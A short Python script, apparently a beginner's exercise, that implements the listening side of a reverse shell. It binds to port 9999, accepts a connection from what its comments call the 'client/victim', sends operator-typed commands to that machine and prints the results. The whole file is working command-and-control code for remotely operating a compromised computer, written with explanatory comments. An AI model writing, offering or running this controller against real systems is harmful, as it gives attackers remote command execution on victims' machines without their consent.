import socket #just a way in which 2 computer can connect
import sys
#to use CLI commands
#creating socket


def create_socket():
    try:
        global host 
        global port 
        global s
        host = ""
        port = 9999 #uncomman port not very commonly used 
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error" + str(msg))
#Binding the socket and listening for connection from client/victim
def bind_socket():
    try:
        global host 
        global port 
        global s
        print("Binding the port " + str(port))
        s.bind((host,port))
        s.listen(5) #where 5 is number of bad connections it will tolerate
    except socket.error as msg:
        print("Socket binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()#recursive function



#accepting connection if listen
#establishing connection with the client socket is listening
def socket_accept():
    #s.accept gives object of connection and list which contain IP address and port
    conn, address = s.accept()
    print("Connection has been established" + "IP" + address[0] + " Port" + str(address[1]))
    #now after setting connection what to do?
    send_commands(conn)
    conn.close()

#sending command to client/victim
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit() #for closing the cmd
        if len(str.encode(cmd))>0:# this means we have typed something
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8") # data received is converted from byte to string
            print(client_response, end = "")#to change the line after output
#if we send data from one computer to another then 
#it is sent in form of byte
#so we need to encode it as well
def main():
    create_socket()
    bind_socket()
    socket_accept()

main()



